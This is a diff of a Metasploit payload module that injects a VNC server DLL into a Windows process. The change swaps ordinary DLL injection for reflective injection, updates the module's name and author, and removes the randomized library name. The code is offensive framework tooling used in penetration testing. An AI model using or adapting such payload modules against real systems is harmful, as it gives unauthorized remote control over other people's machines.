@@ -1,39 +1,26 @@
-##
-# $Id: vncinject.rb 6479 2009-04-13 14:33:26Z kris $
-##
-
-##
-# This file is part of the Metasploit Framework and may be subject to 
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
-
+# Copyright (c) 2008 Stephen Fewer of Harmony Security (www.harmonysecurity.com)
 
 require 'msf/core'
-require 'msf/core/payload/windows/dllinject'
+require 'msf/core/payload/windows/reflectivedllinject'
 require 'msf/base/sessions/vncinject'
-
 
 ###
 #
-# Injects the VNC server DLL and runs it over the established connection.
+# Injects the VNC server DLL (via Reflective Dll Injection) and runs it over the established connection.
 #
 ###
 module Metasploit3
 
-	include Msf::Payload::Windows::DllInject
-
+	include Msf::Payload::Windows::ReflectiveDllInject
+  
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'          => 'Windows VNC Inject',
-			'Version'       => '$Revision: 6479 $',
-			'Description'   => 'Inject the VNC server DLL and run it from memory',
-			'Author'        => [ 'skape', 'jt <jt@klake.org>' ],
-			'License'       => MSF_LICENSE,
-			'Session'       => Msf::Sessions::VncInject))
-
-		sep = File::SEPARATOR
+			'Name'          => 'VNC Server (Reflective Injection)',
+			'Version'       => '$Revision: 6857 $',
+			'Description'   => 'Inject a VNC Dll via a reflective loader',
+			'Author'        => [ 'Stephen Fewer <info@harmonysecurity.com>' ],
+			'Session'       => Msf::Sessions::VncInject ))
+      
 
 		# Override the DLL path with the path to the meterpreter server DLL
 		register_options(
@@ -67,17 +54,7 @@ module Metasploit3
 						false
 					])
 			], self.class)
-
-		# Don't let people set the library name option
-		options.remove_option('LibraryName')
 		options.remove_option('DLL')
-	end
-
-	#
-	# The library name that we're injecting the DLL as can be random.
-	#
-	def library_name
-		Rex::Text::rand_text_alpha(8) + ".dll"
 	end
 
 	def library_path
@@ -115,3 +92,4 @@ module Metasploit3
 	end
 
 end
+
